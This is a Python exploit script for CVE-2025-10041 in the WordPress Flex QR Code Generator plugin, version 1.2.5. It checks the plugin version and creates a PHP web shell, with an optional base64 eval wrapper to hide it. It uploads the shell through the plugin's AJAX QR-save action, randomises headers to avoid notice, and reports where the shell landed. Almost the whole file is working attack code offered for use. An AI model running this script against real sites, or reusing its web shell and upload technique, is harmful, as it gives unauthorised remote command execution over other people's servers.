#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Exploit By Nxploited ( Khaled Alenazi )
# Github: github.com/Nxploited
# Twitter: @Nxploited


import requests
import time
import sys
import argparse
import os
import random
import base64
import urllib.parse

def print_wait(msg, delay=2):
    print(msg)
    time.sleep(delay)

def random_headers(custom_headers=None):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Linux; Android 10)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Nxploited)"
    ]
    referers = [
        "https://google.com",
        "https://bing.com",
        "https://facebook.com",
        "https://twitter.com",
        "https://evil.com"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "close",
        "Referer": random.choice(referers),
        "Cookie": f"wp_nonce={random.randint(100000,999999)}; test={random.randint(1,9999)}"
    }
    if custom_headers:
        headers.update(custom_headers)
    return headers

def get_readme_version(target_url, headers):
    url = f"{target_url}/wp-content/plugins/flex-qr-code-generator/readme.txt"
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200 and "Version: 1.2.5" in resp.text:
            return True
    except Exception:
        pass
    return False

def encode_filename(filename, method):
    if method == "base64":
        encoded = base64.urlsafe_b64encode(filename.encode()).decode()
        return encoded.replace("=", "")
    elif method == "url":
        return urllib.parse.quote(filename)
    return filename

def encode_content(content, method):
    if method == "base64":
        encoded = base64.b64encode(content.encode()).decode()
        return f"<?php eval(base64_decode('{encoded}')); ?>"
    return content

def create_shell_file(shell_name, shell_code=None, encode_content_method=None):
    shell_content = shell_code or "<?php echo shell_exec($_GET['cmd']); ?>"
    if encode_content_method:
        shell_content = encode_content(shell_content, encode_content_method)
    with open(shell_name, "w") as f:
        f.write(shell_content)
    return shell_name

def build_payload(shell_name, qr_name, qr_desc, qr_data, is_tracking):
    qr_json = {
        "qrName": qr_name,
        "qrDesc": qr_desc,
        "qrData": qr_data
    }
    payload = {
        "action": "flexqr_save_qr",
        "qrData": str(qr_json).replace("'", '"'),
        "isTrackingEnabled": str(is_tracking).lower()
    }
    files = {
        "logo": (shell_name, open(shell_name, "rb"))
    }
    return payload, files

def upload_shell(target_url, payload, files, headers, retries=3):
    url = f"{target_url}/wp-admin/admin-ajax.php"
    for attempt in range(retries):
        try:
            resp = requests.post(url, data=payload, files=files, headers=headers, timeout=15)
            return resp
        except Exception as e:
            print(f"Upload error (try {attempt+1}): {str(e)}")
            time.sleep(random.uniform(1, 3))
    return None

def extract_uploaded_name(shell_name, resp_json):
    try:
        inserted_id = resp_json["data"]["id"]
        base, ext = os.path.splitext(shell_name)
        ext = ext.lstrip(".")
        final_name = f"{base}_{inserted_id}.{ext}"
        return final_name
    except Exception:
        return None

def is_successful(resp):
    try:
        js = resp.json()
        if js.get("success") and "QR code saved successfully." in js.get("data", {}).get("message", ""):
            return True, js
    except Exception:
        pass
    return False, None

def Nxploited(args):
    headers = random_headers(args.headers)
    print_wait("Checking vulnerability version...")
    if not get_readme_version(args.url, headers):
        print("Target is not vulnerable.")
        sys.exit(0)
    print("Target is vulnerable ...")
    print_wait("Exploiting ...")

    shell_name = args.shellname
    if args.encode_filename:
        shell_name_encoded = encode_filename(shell_name, args.encode_filename)
        print(f"[*] Filename encoded: {shell_name} -> {shell_name_encoded}")
        shell_name = shell_name_encoded

    create_shell_file(shell_name, encode_content_method=args.encode_content)
    print_wait(f"Uploading shell '{shell_name}' ...")
    payload, files = build_payload(
        shell_name=shell_name,
        qr_name=args.qr_name,
        qr_desc=args.qr_desc,
        qr_data=args.qr_data,
        is_tracking=args.is_tracking
    )
    resp = upload_shell(args.url, payload, files, headers)
    for f in files.values():
        f[1].close()
    if resp is None:
        print("Upload failed.")
        sys.exit(1)
    success, js = is_successful(resp)
    if success:
        uploaded_name = extract_uploaded_name(shell_name, js)
        print("Shell uploaded successfully.")
        print("Shell path (guess):", f"/wp-content/uploads/{uploaded_name}")
        print("Response:", js)
    else:
        print("Upload unsuccessful.")
        print("Response:", resp.text)

def parse_headers(header_list):
    headers = {}
    if header_list:
        for header in header_list:
            if ":" in header:
                key, value = header.split(":", 1)
                headers[key.strip()] = value.strip()
    return headers

def parse_args():
    parser = argparse.ArgumentParser(prog="main.py", description=" Exploit For CVE-2025-10041 - By Nxploited")
    parser.add_argument("-u", "--url", required=True, help="Target site URL (without trailing slash)")
    parser.add_argument("--shellname", default="shell.php", help="Shell filename (default: shell.php)")
    parser.add_argument("--qr_name", default="shell", help="QR name (default: shell)")
    parser.add_argument("--qr_desc", default="bypass", help="QR description (default: bypass)")
    parser.add_argument("--qr_data", default="https://evil.com", help="QR data (default: https://evil.com)")
    parser.add_argument("--is_tracking", default=False, type=bool, help="Tracking enabled (default: False)")
    parser.add_argument("--headers", nargs="*", help="Custom headers in format 'Key: Value'")
    parser.add_argument("--encode_filename", choices=["base64", "url"], help="Encode filename by base64 or url")
    parser.add_argument("--encode_content", choices=["base64"], help="Encode PHP shell content (base64)")
    args = parser.parse_args()
    args.headers = parse_headers(args.headers)
    return args

if __name__ == "__main__":
    args = parse_args()
    Nxploited(args)
